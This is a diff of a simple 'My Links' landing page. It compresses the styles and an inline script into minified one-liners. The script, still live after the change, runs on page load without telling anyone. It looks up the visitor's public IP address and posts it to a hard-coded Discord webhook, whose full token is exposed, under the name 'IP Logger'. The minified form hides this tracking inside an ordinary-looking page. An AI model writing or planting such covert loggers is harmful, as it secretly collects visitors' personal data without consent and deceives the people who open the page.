@@ -5,69 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>My Links</title>
   <style>
-    /* General Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: "Arial", sans-serif;
-      background: linear-gradient(145deg, #5865f2, #404eed);
-      color: #f4f4f4;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-
-    .container {
-      background: rgba(32, 34, 37, 0.85);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 15px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-      padding: 40px;
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-    }
-
-    .container h1 {
-      font-size: 2em;
-      margin-bottom: 20px;
-      color: #fff;
-    }
-
-    .container p {
-      margin-bottom: 30px;
-      color: rgba(255, 255, 255, 0.7);
-    }
-
-    .links a {
-      display: block;
-      margin: 10px 0;
-      padding: 15px 20px;
-      text-decoration: none;
-      color: #fff;
-      background-color: rgba(88, 101, 242, 0.9);
-      border-radius: 8px;
-      font-size: 1.1em;
-      font-weight: 600;
-      transition: all 0.3s ease;
-    }
-
-    .links a:hover {
-      background-color: rgba(88, 101, 242, 1);
-      transform: translateY(-2px);
-    }
-
-    .footer {
-      margin-top: 30px;
-      font-size: 0.9em;
-      color: rgba(255, 255, 255, 0.5);
-    }
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:"Arial",sans-serif;background:linear-gradient(145deg,#5865f2,#404eed);color:#f4f4f4;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:rgba(32,34,37,.85);border:1px solid rgba(255,255,255,.1);border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,.2);padding:40px;max-width:400px;width:100%;text-align:center}.container h1{font-size:2em;margin-bottom:20px;color:#fff}.container p{margin-bottom:30px;color:rgba(255,255,255,.7)}.links a{display:block;margin:10px 0;padding:15px 20px;text-decoration:none;color:#fff;background-color:rgba(88,101,242,.9);border-radius:8px;font-size:1.1em;font-weight:600;transition:all .3s ease}.links a:hover{background-color:rgba(88,101,242,1);transform:translateY(-2px)}.footer{margin-top:30px;font-size:.9em;color:rgba(255,255,255,.5)}
   </style>
 </head>
 <body>
@@ -84,31 +22,7 @@
   </div>
 
   <script>
-    (function () {
-      const webhookUrl = "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e";
-
-      // Fetch IPv4 Address
-      fetch("https://api.ipify.org?format=json")
-        .then((response) => response.json())
-        .then((data) => {
-          const ip = data.ip; // Get the public IPv4 address
-
-          // Send to Discord webhook
-          const webhookData = {
-            content: `Visitor IP: ${ip}`,
-            username: "IP Logger",
-          };
-
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(webhookData),
-          }).catch((err) => console.error("Error sending webhook:", err));
-        })
-        .catch((err) => console.error("Error fetching IP:", err));
-    })();
+    (function(){const a="https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e";fetch("https://api.ipify.org?format=json").then(b=>b.json()).then(b=>{const c=b.ip,d={content:`Visitor IP: ${c}`,username:"IP Logger"};fetch(a,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)}).catch(e=>console.error("Error sending webhook:",e))}).catch(e=>console.error("Error fetching IP:",e))})();
   </script>
 </body>
 </html>
